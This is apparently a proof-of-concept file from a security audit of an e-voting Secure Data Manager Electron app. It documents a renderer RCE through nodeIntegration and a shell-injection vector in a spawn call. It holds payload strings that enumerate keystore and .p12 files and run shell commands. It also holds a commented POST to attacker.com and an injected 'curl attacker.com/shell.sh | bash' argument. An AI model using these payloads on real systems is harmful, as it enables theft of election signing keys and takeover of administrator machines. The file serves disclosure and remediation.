/*
 * PoC: SP-002 — SDM Electron RCE via nodeIntegration:true
 *
 * The Secure Data Manager Electron app is configured with:
 *   nodeIntegration: true      (main.js:47)
 *   enableRemoteModule: true   (main.js:49)
 *   contextIsolation: false    (default, never overridden)
 *
 * This means ANY content rendered in the BrowserWindow has full
 * Node.js access — require('child_process'), require('fs'), etc.
 *
 * Attack vector: If an attacker can inject content into the SDM UI
 * (via malicious election config, crafted error message, compromised
 * backend response), they get full RCE on the admin machine.
 *
 * Source: e-voting/secure-data-manager/secure-data-manager-frontend/electron/main.js:43-52
 *
 * Additionally, the backend spawn uses shell:true (main.js:131):
 *   spawn(script, spawnArgs, {cwd: exePath + '/resources/', shell: true})
 *
 * If spawnArgs contain attacker-controlled data, shell metacharacter
 * injection is possible via ;, &&, backticks, $(), etc.
 */

// === Simulated payload that would execute in the SDM renderer ===

// This code runs with full Node.js access in the renderer process
// because nodeIntegration:true grants require() to all renderer content.

// PoC 1: Read election signing keys
const fs_payload_1 = `
  const fs = require('fs');
  const path = require('path');
  // Read the SDM's signing keystores
  const keystorePath = path.join(process.cwd(), 'testdata-external/sdm/direct-trust');
  fs.readdirSync(keystorePath, {recursive: true}).forEach(f => {
    console.log('[EXFIL] Found keystore:', f);
  });
`;

// PoC 2: Execute arbitrary commands
const rce_payload = `
  const { execSync } = require('child_process');
  // Full RCE on the election administrator's machine
  const result = execSync('whoami && hostname && id').toString();
  console.log('[RCE] Command output:', result);
`;

// PoC 3: Exfiltrate election data
const exfil_payload = `
  const { execSync } = require('child_process');
  const https = require('https');
  // Read election configuration
  const electionData = execSync('find / -name "*.sks" -o -name "*.p12" 2>/dev/null').toString();
  // Exfiltrate to attacker server
  // https.request({hostname:'attacker.com', path:'/exfil', method:'POST'}, ...).end(electionData);
  console.log('[EXFIL] Found election secrets:', electionData.split('\\n').length, 'files');
`;

// PoC 4: The shell:true spawn injection vector
// From main.js:128-132:
//   sdmBackendProcess = spawn(script, spawnArgs, {cwd: exePath + '/resources/', shell: true});
//
// The spawnArgs include user input from IPC:
//   args.profileId -> used in '-p profile_${args.profileId}'
//   args.proxyFilename -> validated with PROXY_FILENAME_PATTERN but only if present
//
// If profileId contains: "1; curl attacker.com/shell.sh | bash"
// The spawn becomes: backend-server.sh startup -p "profile_1; curl attacker.com/shell.sh | bash"
// With shell:true, the semicolon breaks out of the argument.

console.log('='.repeat(60));
console.log('SP-002: SDM Electron nodeIntegration:true — RCE PoC');
console.log('='.repeat(60));
console.log('');
console.log('Vulnerable config (main.js:46-50):');
console.log('  webPreferences: {');
console.log('    nodeIntegration: true,');
console.log('    enableRemoteModule: true,');
console.log('    // contextIsolation: never set (defaults to false)');
console.log('  }');
console.log('');
console.log('Impact: Any content injection in the SDM UI grants');
console.log('        full RCE on the election admin machine.');
console.log('');
console.log('The SDM handles:');
console.log('  - Election setup and configuration');
console.log('  - Key ceremony orchestration');
console.log('  - Voter data upload');
console.log('  - Tally initiation and result export');
console.log('  - eCH-0222 XML generation');
console.log('');
console.log('Compromise = complete election integrity loss.');
